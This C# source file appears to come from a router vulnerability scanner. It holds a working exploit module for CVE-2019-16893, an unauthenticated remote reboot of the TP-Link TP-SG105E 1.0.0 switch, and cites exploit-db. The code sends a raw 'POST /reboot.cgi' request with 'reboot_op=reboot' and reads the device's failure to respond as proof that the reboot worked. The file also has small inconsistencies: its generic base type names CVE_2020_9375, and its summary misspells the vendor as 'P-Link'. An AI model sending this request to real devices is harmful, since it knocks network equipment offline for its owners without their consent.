namespace RouterScanner.Services.VulHub;

/// <summary>
/// P-Link TP-SG105E 1.0.0 - Unauthenticated Remote Reboot
/// <br/><see cref="https://www.exploit-db.com/exploits/47958"/>
/// </summary>
public sealed class CVE_2019_16893 : RouterVulHubBase<CVE_2020_9375>, IRouterVulHub
{
    public string CVE => "CVE-2019-16893";
    public string VulType => "重启服务";
    public string Production => "TP-Link";
    public List<string> Version => ["TP-SG105E 1.0.0"];


    public override async ValueTask<VulResult> Exp(CancellationToken cancellationToken = default)
    {
        var resp = await Request(cancellationToken);
        if (!resp.IsSuccessStatusCode)
        {
            return OK(false);
        }
        resp = await Request(cancellationToken);
        if (!resp.IsSuccessStatusCode)
        {
            return OK();
        }
        return OK(false);
    }

    private Task<HttpResponseMessage> Request(CancellationToken cancellationToken = default)
    {
        var rawText = $"""
            POST /reboot.cgi HTTP/1.1
            Host: {Host}
            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
            Content-Type: application/x-www-form-urlencoded

            reboot_op=reboot
            """;
        return Http.SendAsync(rawText, SSL, cancellationToken);
    }
}
